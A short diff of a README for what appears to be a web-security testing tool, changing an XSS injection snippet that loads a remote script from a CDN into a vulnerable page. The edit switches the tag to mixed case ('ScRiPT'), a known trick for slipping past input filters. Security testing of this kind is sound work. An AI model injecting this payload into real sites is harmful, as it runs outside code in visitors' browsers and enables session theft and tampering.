@@ -13,7 +13,7 @@ To use, enter the following code through the vulnerable section or enter the pag
 Vulnerable Input:
 
 ```javascript
-<SCRIPT SRC=https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js></SCRIPT>
+<ScRiPT SRC=https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js></ScRiPT>
 ```
 
 Inspect Element:
